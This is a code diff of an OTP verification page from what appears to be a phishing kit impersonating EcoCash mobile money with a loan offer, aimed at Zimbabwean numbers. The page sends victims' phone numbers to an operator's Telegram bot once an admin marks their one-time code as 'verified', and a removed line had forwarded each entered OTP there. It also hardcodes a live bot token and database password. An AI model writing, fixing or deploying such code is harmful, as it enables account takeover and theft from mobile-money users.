@@ -1,104 +1,139 @@
 <?php
 session_start();
 
-// ----------------- TELEGRAM CONFIGURATION -----------------
-define('TELEGRAM_BOT_TOKEN', '8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc');
-define('TELEGRAM_CHAT_ID', '-5193742613');
+// ========== POSTGRESQL CONFIGURATION (same as login.php) ==========
+$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
+$dbPort = 5432;
+$dbName = "loan_9d8q";
+$dbUser = "loan_9d8q_user";
+$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
+// ==================================================================
 
-// Database configuration
-$dbHost = getenv('DB_HOST');
-$dbPort = getenv('DB_PORT') ?: 3306;
-$dbName = getenv('DB_NAME');
-$dbUser = getenv('DB_USER');
-$dbPass = getenv('DB_PASS');
+// Telegram configuration (same as login.php)
+$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
+$chatId   = "-5193742613";
 
-$pdo = new PDO(
-    "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4",
-    $dbUser,
-    $dbPass,
-    [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-    ]
-);
+/**
+ * Get PostgreSQL connection (reusable)
+ * @return resource|false
+ */
+function getDbConnection($host, $port, $dbname, $user, $pass) {
+    static $conn = null;
+    if ($conn === null) {
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
+        }
+        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("DB connection failed: " . pg_last_error());
+            return false;
+        }
+    }
+    return $conn;
+}
 
-function sendToTelegram($message) {
-    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
+/**
+ * Send message via Telegram bot (reused from login.php)
+ * @return bool
+ */
+function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $postData = [
-        'chat_id' => TELEGRAM_CHAT_ID,
-        'text' => $message,
-        'parse_mode' => 'HTML'
+        'chat_id' => $chatId,
+        'text'    => $message,
+        'parse_mode' => $parseMode
     ];
     
     if (function_exists('curl_version')) {
         $ch = curl_init();
         curl_setopt_array($ch, [
             CURLOPT_URL => $url,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $postData,
             CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_TIMEOUT => 5,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => http_build_query($postData),
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
         ]);
         $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-        return ($response !== false);
-    } else {
-        $options = [
-            'http' => [
-                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-                'method'  => 'POST',
-                'content' => http_build_query($postData),
-                'timeout' => 5,
-            ],
-        ];
-        $context = stream_context_create($options);
-        $response = @file_get_contents($url, false, $context);
-        return ($response !== false);
+        if ($response !== false && $httpCode === 200) {
+            $result = json_decode($response, true);
+            return isset($result['ok']) && $result['ok'] === true;
+        }
+        return false;
     }
+    
+    // fallback
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($postData),
+            'timeout' => 10,
+            'user_agent' => 'EcoCashBot/1.0'
+        ],
+        'ssl' => ['verify_peer' => true]
+    ];
+    $context = stream_context_create($options);
+    $response = @file_get_contents($url, false, $context);
+    if ($response !== false) {
+        $result = json_decode($response, true);
+        return isset($result['ok']) && $result['ok'] === true;
+    }
+    return false;
 }
-// ---------------------------------------------------------
 
-// Must have phone in session
+// Must have phone in session (set by login.php)
 if (!isset($_SESSION['phone'])) {
     header("Location: login.php");
     exit;
 }
 
-$phone = $_SESSION['phone'];
+$phone = trim($_SESSION['phone']);
 $error = '';
 
 // Process OTP submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $enteredOtp = implode('', $_POST['otp'] ?? []);
+    $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
+    $enteredOtp = implode('', $otpArray);
+    $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
     
-    // Optional: log the OTP attempt (you can keep or remove)
-    // sendToTelegram("📱 OTP attempt for $phone: $enteredOtp");
+    // Note: OTP is not stored in DB; we only check if otp_status = 1 (already verified by admin via verify.php)
+    // So just query the current otp_status for this phone.
     
-    try {
-        $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
-        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-        
+    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+    if (!$conn) {
+        $error = "System error. Please contact administrator.";
+        error_log("PostgreSQL connection failed in otp.php");
+    } else {
         // Get otp_status for this phone
-        $stmt = $pdo->prepare("SELECT otp_status FROM ecocash_auth WHERE phone = :phone LIMIT 1");
-        $stmt->execute([':phone' => $phone]);
-        $record = $stmt->fetch(PDO::FETCH_ASSOC);
-        
-        if ($record && (int)$record['otp_status'] === 1) {
-            // Send Telegram "loan success" message
-            $successMsg = "✅ LOAN SUCCESS ✅\n\n📱 Phone: +263 $phone\n🕒 Time: " . date('Y-m-d H:i:s');
-            sendToTelegram($successMsg);
-            
-            // Redirect to dashboard
-            header("Location: dashboard.php");
-            exit;
+        $stmt = pg_query_params($conn, "SELECT otp_status FROM ecocash_auth WHERE phone = $1 LIMIT 1", [$phone]);
+        if (!$stmt) {
+            error_log("OTP query error: " . pg_last_error($conn));
+            $error = "System error. Try again later.";
         } else {
-            $error = "Wrong OTP";
+            $record = pg_fetch_assoc($stmt);
+            if ($record && (int)$record['otp_status'] === 1) {
+                // Send Telegram "loan success" message (using HTML parse mode)
+                $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
+                sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
+                
+                // Redirect to dashboard
+                header("Location: dashboard.php");
+                exit;
+            } else {
+                $error = "Wrong OTP";
+            }
         }
-    } catch (PDOException $e) {
-        error_log("DB error in otp.php: " . $e->getMessage());
-        $error = "System error. Please try again.";
     }
 }
+
+// Helper to mask phone for display
+$maskedPhone = substr(preg_replace('/\D/', '', $phone), 0, 3) . "****" . substr(preg_replace('/\D/', '', $phone), -2);
 ?>
 <!DOCTYPE html>
 <html>
@@ -241,7 +276,7 @@ button:hover {
 <div class="container">
     <h2>OTP Verification</h2>
     <p>Enter the OTP sent to your phone number<br>
-        <strong>+263 <?= htmlspecialchars(substr(preg_replace('/\D/', '', $_SESSION['phone']), 0, 3) . "****" . substr(preg_replace('/\D/', '', $_SESSION['phone']), -2)) ?></strong>
+        <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
     </p>
 
     <?php if ($error): ?>
